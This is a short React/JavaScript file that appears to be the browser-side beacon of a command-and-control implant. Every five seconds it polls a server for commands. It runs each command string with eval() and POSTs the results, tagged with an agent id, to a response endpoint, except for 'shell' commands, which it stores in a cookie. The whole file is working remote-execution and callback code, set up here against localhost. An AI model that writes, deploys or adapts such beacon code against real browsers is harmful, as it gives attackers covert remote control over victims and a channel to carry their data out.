import React, { Component } from 'react';
import ReactDOM from 'react-dom';

//Beacon Handler
var BeaconHandler = React.createClass({
  loadCommandsFromServer: function() {
    $.ajax({
      url: this.props.url,
      dataType: 'json',
      cache: false,
      success: function(data) {
        this.setState({data: data});
      }.bind(this),
      error: function(xhr, status, err) {
        console.log(this.props.url, status, err.toString());
      }.bind(this)
    });
  },
  getInitialState: function() {
    return {data: []};
  },
  componentDidMount: function() {
    this.loadCommandsFromServer();
    setInterval(this.loadCommandsFromServer, this.props.pollInterval);
  },
  //Push tasks to execution
  render: function() {
   return (
     <Exec data = {this.state.data} />
   );
  }
});

//Execute Commands
var Exec = React.createClass({
  render: function() {
    console.log(this.props.data);
    console.log(this.props.data.cmd);

    var resp = this.props.data;
    var agentid = this.props.data.agentid;

    if (resp.cmd == "shell") {
      var expires = new Date();
      expires.setTime(expires.getTime() + (1 * 24 * 60 * 60 * 1000));
      document.cookie = "cmd=!!@" + resp.cmd + '!!@;expires=' + expires.toUTCString();

    //In Browser Execution
    } else {
      //Exec
      var res = eval(resp.cmd);

      //POST Response
      var request = new XMLHttpRequest();
      request.open('POST', 'http://localhost:80/responsepost', true);
      request.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');

      request.send(JSON.stringify({resp: res, agentid: agentid}));
    }
    return (
      <b></b>
    );
  }
});

ReactDOM.render(
  <BeaconHandler url={'http://localhost:80/test.html'} pollInterval={5000} />, document.getElementById('root')
);
